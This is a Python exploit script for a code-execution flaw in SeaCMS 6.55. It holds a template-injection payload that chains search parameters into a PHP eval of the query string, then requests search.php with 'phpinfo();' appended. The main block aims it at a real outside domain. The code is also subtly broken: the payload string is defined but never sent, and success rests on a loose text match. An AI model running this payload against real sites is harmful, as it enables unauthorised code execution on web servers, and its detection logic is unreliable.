#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: seacms 6.55 代码执行
referer: https://www.freebuf.com/vuls/150303.html
author: qianxiao9996
description: 海洋CMS（SEACMS）新版本V6.55补丁仍可被绕过执行任意代码
'''
import sys
import requests
import warnings
def run(url):
        result = ['seacms 6.55 代码执行','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }

        payload = "searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*"
        url_path = url + "/search.php?phpinfo();"
        try:
            result2 = requests.get(url_path, timeout=3,headers=headers, verify=False)
            if result2.status_code == 200 and 'code' in result2.text:
                result[2]=  '存在'
                result[1] =url_path
                return result
            else:
                result[2]=  '不存在'
                return result
        except Exception as e:
            # print (e)
            result[2]='不存在'
            return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run("http://baidu.com")
